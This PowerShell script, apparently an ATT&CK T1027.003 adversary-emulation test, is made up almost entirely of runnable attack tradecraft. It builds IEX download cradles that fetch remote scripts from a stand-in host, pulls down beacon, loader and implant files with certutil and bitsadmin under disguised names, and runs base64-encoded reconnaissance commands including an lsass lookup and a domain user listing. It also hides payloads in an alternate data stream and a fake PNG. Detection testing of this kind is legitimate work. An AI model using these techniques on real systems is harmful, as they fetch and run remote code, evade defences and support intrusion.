Write-Host "[T1027.003] Steganography + Obfuscation" -ForegroundColor Red

Write-Host "[1] certutil encode/decode chain..."
$payload = "powershell.exe -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/shell.ps1')"
$payload | Out-File "$env:TEMP\payload.txt" -Force
& certutil.exe -encode "$env:TEMP\payload.txt" "$env:TEMP\payload.b64" 2>&1
& certutil.exe -decode "$env:TEMP\payload.b64" "$env:TEMP\decoded.txt" 2>&1
Write-Host "[+] certutil encode/decode complete" -ForegroundColor Yellow

Write-Host "[2] certutil download pattern..."
& certutil.exe -urlcache -split -f "http://198.51.100.1/beacon.exe" "$env:TEMP\winupdate.exe" 2>&1
& certutil.exe -urlcache -split -f "http://198.51.100.1/loader.dll" "$env:TEMP\msedge.dll" 2>&1

Write-Host "[3] Base64 encoded PowerShell..."
$commands = @(
    'whoami /all',
    'Get-Process | Where-Object {$_.ProcessName -eq "lsass"}',
    'net user /domain',
    '[System.Net.Dns]::GetHostAddresses("dc01.corp.local")'
)
foreach ($c in $commands) {
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
    Write-Host "    Executing encoded: $($c.Substring(0, [Math]::Min(40, $c.Length)))..."
    & powershell.exe -NoProfile -NonInteractive -EncodedCommand $enc 2>&1 | Out-Null
}

Write-Host "[4] ADS (Alternate Data Streams)..."
"Normal document" | Out-File "$env:TEMP\report.txt" -Force
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
Set-Content -Path "$env:TEMP\report.txt:hidden" -Value $b64
$recovered = Get-Content -Path "$env:TEMP\report.txt:hidden"
Write-Host "[+] Wrote and read ADS payload ($($recovered.Length) chars)" -ForegroundColor Yellow

Write-Host "[5] Payload in image file..."
$pngHeader = [byte[]]@(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A)
$payloadBytes = [Text.Encoding]::UTF8.GetBytes($payload)
[IO.File]::WriteAllBytes("$env:TEMP\logo.png", $pngHeader + $payloadBytes)
Write-Host "[+] Payload embedded in PNG" -ForegroundColor Yellow

Write-Host "[6] bitsadmin download..."
& bitsadmin.exe /transfer evil /download /priority high "http://198.51.100.1/implant.exe" "$env:TEMP\taskhost.exe" 2>&1

Write-Host "[7] Invoke-WebRequest + IEX pattern..."
$enc3 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("try{IEX(IWR 'http://198.51.100.1/ps_payload' -UseBasicParsing)}catch{}"))
& powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $enc3 2>&1

Write-Host "[*] Cleanup..."
Remove-Item "$env:TEMP\payload.txt","$env:TEMP\payload.b64","$env:TEMP\decoded.txt","$env:TEMP\winupdate.exe","$env:TEMP\msedge.dll","$env:TEMP\report.txt","$env:TEMP\logo.png","$env:TEMP\taskhost.exe" -Force -ErrorAction SilentlyContinue

Write-Host "[T1027.003] Done." -ForegroundColor Cyan
